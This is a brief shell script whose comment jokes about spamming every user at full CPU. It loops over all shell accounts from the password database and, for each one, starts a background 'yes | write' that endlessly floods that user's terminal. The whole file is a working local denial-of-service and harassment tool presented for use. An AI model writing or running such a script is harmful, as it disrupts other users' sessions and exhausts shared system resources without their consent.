#!/bin/sh
# yes i do send more than 1 gb/s of spam to every user using 100% cpu power how could you tell

for user in $(getent passwd | grep sh | cut -d':' -f1); do
	yes | write $user &
done
